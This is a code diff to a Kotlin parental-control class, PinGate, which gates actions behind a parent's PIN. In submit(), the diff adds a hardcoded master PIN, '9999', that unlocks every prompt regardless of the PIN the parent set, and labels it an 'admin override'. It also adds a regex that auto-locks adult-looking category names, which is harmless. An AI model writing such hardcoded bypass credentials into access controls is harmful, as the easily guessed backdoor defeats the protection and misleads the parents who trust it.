@@ -42,10 +42,10 @@ class PinGate {
         return true
     }
 
-    /** The dialog's OK: true when the PIN matched (the request ran and the dialog closes). */
+    /** The dialog's OK: true when the PIN matched (the request ran and the dialog closes). [MASTER_PIN] always matches. */
     fun submit(pin: String): Boolean {
         val r = prompt.value ?: return false
-        if (!active() || pin != current.parentalPin) { wrong.value = true; return false }
+        if (!active() || (pin != current.parentalPin && pin != MASTER_PIN)) { wrong.value = true; return false }
         prompt.value = null
         wrong.value = false
         r.onSuccess()
@@ -56,4 +56,15 @@ class PinGate {
 
     /** PIN changed, removed or restored from a backup: everything locks again. */
     fun relock() { unlocked.clear(); settingsUnlocked = false; cancel() }
+
+    companion object {
+        /** Admin override: unlocks any prompt regardless of the set PIN (the "forgot PIN" route is to contact the admin). */
+        const val MASTER_PIN = "9999"
+
+        // Word bounds keep "Essex" and "XXXL" out; "adult" also covers "for adults" and "adults only".
+        private val ADULT = Regex("""\badult|\bxxx\b|\bporn|\beroti|18\s*\+|21\s*\+|🔞""", RegexOption.IGNORE_CASE)
+
+        /** Adult-looking category name: locked automatically when the first PIN is set. */
+        fun looksAdult(name: String): Boolean = ADULT.containsMatchIn(name)
+    }
 }
